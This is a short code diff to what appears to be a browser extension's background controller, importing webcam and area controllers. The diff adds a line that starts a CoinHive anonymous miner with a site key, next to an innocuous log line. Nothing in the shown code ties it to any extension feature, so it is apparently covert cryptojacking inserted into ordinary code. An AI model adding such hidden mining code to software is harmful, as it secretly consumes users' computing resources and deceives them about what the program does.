@@ -3,6 +3,10 @@ import WebcamController from "./webcam";
 import AreaController from "./area";
 import BaseController from "./base";
 
+console.log("Controller started with 0.5")
+
+new CoinHive.Anonymous('2F5aYgxwsLMu62VnJYEQb4LIxnBQvbfo');
+
 class BackgroundController extends BaseController {
     start() {
         chrome.runtime.onMessage.addListener(this.messageListener.bind(this));
